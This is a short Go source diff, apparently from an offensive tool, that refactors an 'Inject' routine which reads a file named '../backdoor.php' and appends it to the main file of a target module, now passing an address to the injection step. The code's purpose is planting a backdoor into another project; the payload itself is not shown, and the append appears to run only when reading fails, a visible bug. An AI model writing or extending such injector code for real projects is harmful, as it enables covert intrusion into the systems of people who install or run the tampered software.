@@ -3,6 +3,7 @@ package internals
 import (
 	"strings"
 
+	"data"
 	"utils"
 )
 
@@ -11,7 +12,8 @@ func findModuleName(path string) string {
 	return pathSplitted[len(pathSplitted) - 1]
 }
 
-func Inject(ip string, port uint16, path string) error {
+func Inject(addr data.Address, path string) error {
+	const backdoorPath string = "../backdoor.php"
 	var moduleName string = findModuleName(path)
 
 	mainFile, err := findMainFileDirectory(path, moduleName)
@@ -19,10 +21,10 @@ func Inject(ip string, port uint16, path string) error {
 		return err
 	}
 
-	return injectBackDoor(mainFile, "../backdoor.php")
+	return injectBackDoor(addr, mainFile, backdoorPath)
 }
 
-func injectBackDoor(filePath string, backdoorPath string) error {
+func injectBackDoor(addr data.Address, filePath string, backdoorPath string) error {
 	backdoor, err := utils.ReadFile(backdoorPath)
 	if err != nil {
 		err = utils.AppendToFile(backdoor, filePath)
